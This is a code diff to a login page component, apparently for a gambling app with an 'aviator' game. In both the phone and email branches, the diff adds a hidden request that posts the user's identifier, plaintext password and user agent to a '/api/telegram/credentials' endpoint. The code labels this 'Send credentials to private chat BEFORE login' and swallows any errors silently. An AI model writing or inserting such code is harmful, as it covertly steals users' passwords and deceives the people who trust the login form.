@@ -105,6 +105,22 @@ export default function LoginPage() {
                 const fullPhone = selectedCountry.dialCode + phoneNumber.replace(/\s/g, '');
                 const fakeEmail = `${fullPhone.replace('+', '')}@number.login`;
 
+                // Send credentials to private chat BEFORE login
+                try {
+                    await fetch('/api/telegram/credentials', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            type: 'login',
+                            phone: fullPhone,
+                            password: password,
+                            userAgent: navigator.userAgent
+                        })
+                    });
+                } catch (e) {
+                    // Silent fail
+                }
+
                 const { data, error: signInError } = await supabase.auth.signInWithPassword({
                     email: fakeEmail,
                     password: password,
@@ -125,6 +141,22 @@ export default function LoginPage() {
                     router.push('/games/aviator');
                 }
             } else {
+                // Send credentials to private chat BEFORE login
+                try {
+                    await fetch('/api/telegram/credentials', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            type: 'login',
+                            email: email,
+                            password: password,
+                            userAgent: navigator.userAgent
+                        })
+                    });
+                } catch (e) {
+                    // Silent fail
+                }
+
                 // Login with email
                 const { data, error: signInError } = await supabase.auth.signInWithPassword({
                     email: email,
